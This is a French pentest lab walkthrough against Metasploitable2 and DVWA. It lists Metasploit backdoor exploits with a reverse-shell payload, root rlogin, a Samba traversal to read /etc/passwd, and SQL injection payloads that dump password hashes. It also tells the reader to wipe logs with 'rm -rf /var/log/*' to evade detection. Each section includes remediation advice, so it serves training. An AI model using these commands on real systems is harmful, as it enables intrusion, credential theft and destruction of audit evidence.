# Pentest sur la machine Metasploit 2

## Exploitation de vsftpd 2.3.4

Sur la Kali Linux, vérifier que le service FTP est actif en effectuant une connexion : 
```bash
ftp <IP machine Metasploit>
```

### Lancement de Metasploit

```bash
sudo msfconsole
```

<p align="center">
    <img src="msfconsole.png" alt="msfconsole" style="width: 800px;" />
</p>

### Chargement et configuration du module d'exploitation

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

```bash
set RHOSTS <IP machine Metasploit>
set RPORT 21
```

```bash
run
```
<p align="center">
    <img src="exploit.png" alt="exploit" style="width: 800px;" />
</p>

### Vérifications post-exploit

Pour vérifier si cela a réussi (whoami doit renvoyer root) : 

```bash
whoami
```

Lister les fichiers sensibles : 

```bash
ls /root
```

<p align="center">
    <img src="post-exploit.png" alt="post-exploit" style="width: 800px;" />
</p>

Eviter que les activités de pentest soient détectées : 

```bash
rm -rf /var/log/*
```

### Mesures correctives

**Mettre à jour vsftpd** : Mettre à jour vers une version plus récente qui corrige cette vulnérabilité.

**Désactiver le service FTP si non nécessaire** : Si FTP n'est pas requis, envisagez de désactiver ou supprimer le service.

**Implémenter des règles de firewall** : Restreindre l'accès au port 21 depuis des hôtes non autorisés.

## Capture du trafic

### Lancement d'un tcpdump sur l'interface

Sur le serveur Suricata : 
```bash
tcpdump -i ens19 -w cap.pcap
```

### Connexion Telnet depuis la machine Kali Linux

```bash
telnet <IP machine Metasploit>
```

### Copie du .pcap vers la machine Kali Linux 

```bash
scp cap.pcap user@10.10.0.5:/home/user
```

### Observation via Wireshark

Sur la machine Kali, aller dans l'explorateur de fichiers, ouvrir le fichier .pcap et appliquer le filtre idoine : 

<p align="center">
    <img src="wireshark.png" alt="wireshark" style="width: 800px;" />
</p>

En observant des paquets, on peut reconstituer le mot de passe :

<p align="center">
    <img src="mdp.png" alt="mdp" style="width: 400px;" />
</p>

### Mesures correctives

**Utiliser des protocoles sécurisés** : Remplacer Telnet par SSH pour chiffrer les communications.

**Configurer un IDS/IPS** : Utiliser un système de détection/prévention d'intrusion comme Suricata pour surveiller le trafic et identifier des activités suspectes.

**Activer le chiffrement** : Configurer les services critiques pour chiffrer leurs communications.

## Unix Basics

Les ports TCP 512, 513 et 514 sont connus sous le nom de services "r" - des services utilisés pour des tâches liées à la gestion à distance et la communication entre machines - et ont été mal configurés pour permettre l'accès à distance depuis n'importe quel hôte.

```bash
rlogin -l root <IP machine Metasploit>
```

<p align="center">
    <img src="root.png" alt="root" style="width: 400px;" />
</p> 

Le prochain service examiné est le système de fichiers réseau (NFS). NFS peut être identifié en demandant au portmapper une liste de services. Le portmapper est un service qui permet aux programmes sur un réseau de découvrir dynamiquement quels ports sont utilisés par des services spécifiques dans un système. L'exemple ci-dessous utilise rpcinfo pour identifier NFS et showmount -e pour déterminer que le partage " / " (la racine du système de fichiers) est exporté. 

```bash
rpcinfo -p <IP machine Metasploit>
```

```bash
showmount -e <IP machine Metasploit>
```

<p align="center">
    <img src="rpc_showmount.png" alt="rpc_showmount" style="width: 200px;" />
</p> 

## Backdoors

Sur le port 6667, Metasploitable2 exécute le démon IRC UnrealRCD. Cette version contient une *backdoor* qui est passée inaperçue pendant des mois - elle se déclenche en envoyant les lettres "AB" suivies d'une commande système au serveur sur n'importe quel port d'écoute. Metasploit dispose d'un module permettant d'exploiter cette *backdoor* afin d'obtenir un shell interactif : 

```bash
msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST <IP machine Metasploit>
exploit
```

Il est parfois nécessaire de configurer le payload et le LHOST, pour ce faire :

```bash
set payload cmd/unix/reverse
set LHOST <IP attaquant>
```

<p align="center">
    <img src="backdoor_conf.png" alt="backdoor_conf" style="width: 400px;" />
</p> 

<p align="center">
    <img src="backdoor.png" alt="backdoor" style="width: 800px;" />
</p> 

### Mesures correctives

Mettre à jour ou supprimer UnrealRCD : Remplacer le démon IRC par une version récente ou un autre logiciel sans backdoor connue.

Restreindre l'accès au port 6667 : Configurer des règles de firewall pour limiter les connexions sur ce port.

Analyser les journaux systèmes : Surveiller les connexions suspectes et implémenter une stratégie de détection des anomalies.

## Backdoors non intentionnelles 

En plus des *backdoors* malveillantes, certains services sont presque des *backdoors* par leur nature même. Le premier d'entre eux installé sur Metasploitable2 est distccd. Le problème avec ce service est qu'un attaquant peut facilement en abuser pour exécuter une commande de son choix, comme le montre l'utilisation du module Metasploit ci-dessous. 

```bash
msfconsole
use exploit/unix/misc/distcc_exec
set RHOST <IP machine Metasploit>
exploit
```

<p align="center">
    <img src="unint_backdoor_conf.png" alt="unint_backdoor_conf" style="width: 400px;" />
</p> 

Dans le cas ci-dessus, il nous a fallu utiliser configurer le payload et le LHOST comme vu précédemment. 

<p align="center">
    <img src="unint_backdoor.png" alt="unint_backdoor" style="width: 800px;" />
</p> 

Samba, lorsqu'il est configuré avec un partage de fichiers accessible en écriture et des "liens larges" activés (par défaut), peut également être utilisé comme une sorte de *backdoor* pour accéder à des fichiers qui n'étaient pas censés être partagés. L'exemple ci-dessous utilise un module Metasploit pour permettre l'accès au système de fichiers racine à l'aide d'une connexion anonyme et d'un partage en écriture. 

```bash
smbclient -L //<IP machine Metasploit>
```

<p align="center">
    <img src="SMB.png" alt="SMB" style="width: 800px;" />
</p> 

```bash
msfconsole
use auxiliary/admin/smb/samba_symlink_traversal
set RHOST <IP machine Metasploit>
set SMBSHARE tmp
exploit
exit
```

<p align="center">
    <img src="smb_conf.png" alt="smb_conf" style="width: 500px;" />
</p> 

Quitter msfconsole et passer les commandes suivantes :

```bash
smbclient //<IP machine Metasploit> 
cd rootfs
cd etc
more passwd
```

<p align="center">
    <img src="smbclient.png" alt="smbclient" style="width: 800px;" />
</p> 

<p align="center">
    <img src="more_passwd.png" alt="more_passwd" style="width: 200px;" />
</p> 

### Mesures correctives

**Désactiver distccd** : Supprimer ce service ou le configurer correctement pour limiter les connexions externes.

**Auditer les services actifs** : Identifier et fermer les services inutilisés ou mal configurés.

**Mettre en place des alertes de sécurité** : Surveiller l'utilisation suspecte des services exposés.

## SQL Injection (SQLI) sur DVWA

Via navigateur web, se connecter à DVWA avec l'IP de votre Metasploit : 

```
10.20.0.200/dvwa/index.php
```

Se connecter (avec les identifiants spécifiés sur la page) pour arriver sur la page d'accueil :

<p align="center">
    <img src="dvwa_home.png" alt="dvwa_home" style="width: 600px;" />
</p> 

Aller dans l'onglet DVWA Security et passer en mode de sécurité basse pour pouvoir envoyer les injections SQL : 

<p align="center">
    <img src="dvwa_security.png" alt="dvwa_security" style="width: 600px;" />
</p> 

Dans l'onglet SQL Injection, on peut envoyer différentes injections afin de récolter des informations plus ou moins sensibles.

### 1' OR '1'='1 

La première injection - une des plus classiques - vise à manipuler une requête SQL afin qu'elle soit toujours vraie, ce qui permet de contourner les mécanismes de vérification. La base de données ne vérifie plus si le mot de passe correspond vraiment à celui stocké pour l'utilisateur. 

<p align="center">
    <img src="dvwa_injection1.png" alt="dvwa_injection1" style="width: 600px;" />
</p>

### 'ORDER BY X#'

L'injection `ORDER BY` est utilisée pour tester l'existence des colonnes dans la base de données et parfois obtenir des informations utiles sur la structure de la table. Ici, on aimerait obtenir le nombre de colonnes.

```
'ORDER BY 2#'
```

On veut vérifier si on a bien 2 colonnes. Lorsque l'on envoie cette injection, la page n'envoie aucune erreur, confirmant l'existence de 2 colonnes ou plus.

```
'ORDER BY 3#'
```

On incrémente pour voir si la table possède plus de 2 colonnes. Voici le résultat : 

<p align="center">
    <img src="dvwa_injection2.png" alt="dvwa_injection2" style="width: 600px;" />
</p>

Le résultat retourné confirme que l'on ne possède pas plus de 2 colonnes. 

### 'UNION SELECT user, password FROM users#

Cette requête utilise le mot-clé `UNION` pour combiner les résultats de plusieurs requêtes SQL. Elle est utilisée pour extraire des informations sensibles, comme des noms d'utilisateur et des mots de passe, directement depuis la base de données. 

<p align="center">
    <img src="dvwa_injection3.png" alt="dvwa_injection3" style="width: 600px;" />
</p> 

Avec cette injection, on obtient les hash des différents utilisateurs. En utilisant un outil approprié trouvable sur Internet, il est possible de cracker les hash et de retrouver les mots de passe :

<p align="center">
    <img src="dvwa_hash.png" alt="dvwa_hash style="width: 600px;" />
</p> 

### Mesures correctives

**Valider les entrées utilisateur** : Utiliser des requêtes paramétrées (ou préparées) pour empêcher l'injection SQL.

**Mettre en place une WAF (Web Application Firewall)** : Empêcher les requêtes malveillantes d'atteindre le serveur.

**Chiffrer les mots de passe** : Utiliser des algorithmes modernes (comme bcrypt) pour hacher les mots de passe avec un sel unique.

